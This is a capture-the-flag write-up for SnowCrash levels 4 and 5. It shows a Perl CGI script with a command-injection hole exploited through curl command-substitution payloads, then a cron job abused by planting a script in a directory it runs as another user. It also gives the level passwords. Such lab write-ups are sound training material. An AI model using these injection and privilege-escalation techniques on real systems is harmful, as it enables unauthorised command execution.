## level04:

 

I found a Perl file, which is a high-level programming language. I executed the file, and the output is:

```bash
level04@SnowCrash:~$ ls
level04.pl
level04@SnowCrash:~$ ./level04.pl
Content-type: text/html

level04@SnowCrash:~$
```

I used the `cat` command on this file:

```bash
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
level04@SnowCrash:~$
```

Let's break down the Perl code:

```bash
#localhost:4747 This is a comment, often used for documentation or notes that mean the port the used is 4747
```

```bash
use CGI qw{param}; # Importing CGI module is used to handle web-based input and output
```

```bash
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
#Define a subroutine x: This is a subroutine named x. 
#It takes one argument ($_[0]), assigns it to the variable $y, 
#and then executes a shell command echo $y.
#The backticks ` are used to execute the command in the shell. 
#2>&1 redirects both standard error and standard output to the same place. 
#The result is then printed.
```

```bash
x(param("x"));

#This line calls the x subroutine with the value of the CGI parameter named "x"
```

I know that the code can execute commands as root, like this: 

```c
level04@SnowCrash:~$ netstat -tuln | grep 4747
tcp6       0      0 :::4747                 :::*                    LISTEN
level04@SnowCrash:~$
```

```bash
evel04@SnowCrash:~$ curl '0.0.0.0:4747/?x=$(ls)'
[level04.pl](http://level04.pl/)
level04@SnowCrash:~$
```

Now I am going to execute the `getflag` command.

```bash
level04@SnowCrash:~$ curl '0.0.0.0:4747/?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
level04@SnowCrash:~$
```

The password for the next level is:`ne2searoevaevoem4ov4ar8ap`

```bash
level04@SnowCrash:~$ su level05
Password:ne2searoevaevoem4ov4ar8ap
level05@SnowCrash:~$
```

## level05:

At this level, I also need to obtain the flag. Upon logging in, I noticed something strange: I received the message, 'You have new mail’.

```bash
~ ssh level05@10.13.100.136 -p 4242
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          10.13.100.136
level05@10.13.100.136's password:ne2searoevaevoem4ov4ar8ap
You have new mail.
level05@SnowCrash:~$
```

Now, I am going to search for the mail directory:

```bash
level05@SnowCrash:~$ find / -name mail 2> /dev/null
/usr/lib/byobu/mail
/var/mail
/var/spool/mail
/rofs/usr/lib/byobu/mail
/rofs/var/mail
/rofs/var/spool/mail
level05@SnowCrash:~$

```

Some of the directories related to mail contain a cron job. This cron job executes every 2 minutes:

```bash
level05@SnowCrash:~$ ls /var/mail
level05
level05@SnowCrash:~$ cat /var/mail/*
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
level05@SnowCrash:~$

```

Every 2 minutes, the cron job executes the scripts located in the `/opt/openarenaserver/*` directory. I will create a script in this directory to obtain the flag (`getflag05`).

```bash
level05@SnowCrash:~$ echo '#!/bin/sh' > /opt/openarenaserver/getflag.sh
level05@SnowCrash:~$ echo '/bin/getflag > /tmp/flag05' >> /opt/openarenaserver/getflag.sh
level05@SnowCrash:~$ cat /opt/openarenaserver/getflag.sh
#!/bin/sh
/bin/getflag > /tmp/flag05
level05@SnowCrash:~$
```

After 2 minutes, I will check the contents of `/tmp/flag05` using the `cat` command.

```bash
level05@SnowCrash:~$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
level05@SnowCrash:~$
```

The password for the next level is `viuaaale9huek52boumoomioc`.

```bash
level05@SnowCrash:~$ su level06
Password:viuaaale9huek52boumoomioc
level06@SnowCrash:~$
```

##